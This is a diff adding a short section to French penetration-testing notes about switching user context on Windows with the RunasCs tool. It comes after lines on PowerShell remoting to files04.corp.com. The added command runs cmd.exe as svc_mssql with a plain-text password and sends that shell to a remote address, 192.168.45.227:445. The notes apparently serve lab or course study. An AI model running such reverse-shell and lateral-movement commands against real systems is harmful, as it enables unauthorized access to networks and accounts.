@@ -91,3 +91,13 @@ $files04 = New-PSSession -ComputerName files04.corp.com
 Enter-PSSession -Session $files04
 ```
 
+# Déplacement vers un autre utilisateur sans refaire authentification
+
+On peut si on est connecté à un utilisateur, translater vers un autre utilisateur si on a son mot de passe sans repasser par l'authentification.
+https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1
+
+```
+import-module ./Invoke-RunasCs.ps1
+
+Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 192.168.45.227:445
+```
